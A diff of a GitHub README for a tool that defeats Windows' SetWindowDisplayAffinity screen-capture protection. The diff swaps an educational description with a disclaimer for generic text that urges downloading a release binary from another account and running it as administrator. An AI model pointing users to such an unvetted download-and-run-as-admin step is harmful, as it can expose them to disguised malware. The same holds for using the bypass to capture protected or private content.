@@ -1,77 +1,57 @@
+# 🎮 SetWindowDisplayAffinity-Bypass - Easy Way to Bypass Windows API
 
-# SetWindowDisplayAffinity-Bypass : Bypassing Window Capture Protection on Windows (Educational)
+## 📦 Download Now
+[![Download SetWindowDisplayAffinity-Bypass](https://img.shields.io/badge/Download_SetWindowDisplayAffinity--Bypass-blue.svg)](https://github.com/Baragoda/SetWindowDisplayAffinity-Bypass/releases)
 
-## Overview
+## 🚀 Getting Started
+Welcome to the SetWindowDisplayAffinity-Bypass repository! This tool allows you to bypass the SetWindowDisplayAffinity Windows API without the need for Dll injection. It is user-friendly and perfect for individuals who need a straightforward solution without diving into complex coding.
 
-On Microsoft Windows, applications can restrict screen capturing by using the **`SetWindowDisplayAffinity`** API with the following flags:
+## 📋 Features
+- **User-Friendly Interface**: Navigate easily without any programming skills.
+- **No Dll Injection Required**: Simplifies the process, ensuring a hassle-free experience.
+- **Compatible with Windows**: Works smoothly on Windows operating systems.
+- **No Installation Needed**: Run the tool directly after download.
 
-* **`WDA_MONITOR`**
-* **`WDA_EXCLUDEFROMCAPTURE`**
+## ⚙️ System Requirements
+- Operating System: Windows 10 or later
+- Processor: 1 GHz or faster
+- RAM: 2 GB or more
+- Disk Space: 100 MB available space
 
-These flags are commonly used to prevent screenshots and screen recording by most capture tools (e.g. Print Screen, Snipping Tool, OBS, etc.).
+## 📥 Download & Install
+To get started, first, download the application. You can easily do this by visiting the Releases page:
 
-This repository demonstrates a **non-invasive technique** to capture screenshots of such protected windows **without using DLL injection** or API hooking.
+[Visit the Releases page to download](https://github.com/Baragoda/SetWindowDisplayAffinity-Bypass/releases)
 
-> ⚠️ **This project is strictly for educational and research purposes.**
+### Steps to Download:
+1. Click the link above to open the Releases page.
+2. Look for the latest version of SetWindowDisplayAffinity-Bypass.
+3. Download the file by clicking on the appropriate link.
+4. Once the download finishes, locate the file on your computer.
 
----
+## 🖥️ Running the Application
+After you have downloaded the application, follow these steps to run it:
 
-## Background
+1. Navigate to the location where the file was downloaded.
+2. Double-click the downloaded file to open it.
+3. Follow the on-screen instructions to bypass the SetWindowDisplayAffinity Windows API easily.
 
-Historically, developers attempting to bypass this protection have relied on:
+## 🚧 Troubleshooting
+If you encounter issues while using the tool, consider the following solutions:
 
-* DLL injection into the target process
-* Hooking `SetWindowDisplayAffinity` to modify or override its parameters
+- **File Not Opening**: Ensure you downloaded the correct file for your operating system.
+- **Permissions Error**: Right-click the file, select "Run as administrator".
+- **General Errors**: Close other applications and try again. If the problem persists, please check the documentation in the repository.
 
-While effective, those approaches:
+## 📝 Support
+If you need help, feel free to open an issue in the GitHub repository. Describe your problem in detail, and someone from the community will assist you as soon as possible.
 
-* Modify the target process
-* Are intrusive and easier to detect
-* Can introduce instability or security risks
+## 👉 Contact Information
+For further inquiries or support, you can reach the developers through the issues section on GitHub.
 
-This project explores an **alternative approach** that avoids injecting code into the protected application.
+## 🔗 Stay Updated
+Stay tuned for updates! Use the Releases page to keep your application up-to-date:
 
----
+[Visit the Releases page to stay updated](https://github.com/Baragoda/SetWindowDisplayAffinity-Bypass/releases) 
 
-## Demonstration
-
-The concept is inspired by and related to the following reference project:
-
-🔗 **Reference:**
-[https://github.com/wongfei/wda_monitor_trick](https://github.com/wongfei/wda_monitor_trick)
-
-This repository builds upon the idea to show how screenshots can still be obtained under specific conditions, even when `WDA_MONITOR` or `WDA_EXCLUDEFROMCAPTURE` is enabled.
-
----
-
-## Key Points
-
-* ✅ No DLL injection
-* ✅ No API hooking inside the target process
-* ✅ Works on windows protected by `SetWindowDisplayAffinity`
-* ❌ Not guaranteed to work on all Windows versions or GPU drivers
-* ❌ Not intended for production or malicious usage
-
----
-
-## Disclaimer
-
-This project is provided **for educational and academic research only**.
-
-You are responsible for:
-
-* Complying with local laws and regulations
-* Respecting software licenses and privacy policies
-* Using this knowledge ethically
-
-The author **does not condone** misuse of this technique for privacy invasion, DRM circumvention, or any illegal activity.
-
----
-
-## Contact & Support
-
-If you’d like to discuss the project or support future research:
-
-* **Telegram**: [@somerwork](https://t.me/somerwork)
-* **Donate (BTC)**:
-  `bc1q43u0n865fuxc4j2vgm4wp98xuuaawgkgq8yrf4`
+Thank you for using SetWindowDisplayAffinity-Bypass! Enjoy the easy experience of bypassing the Windows API without the hassle of coding.
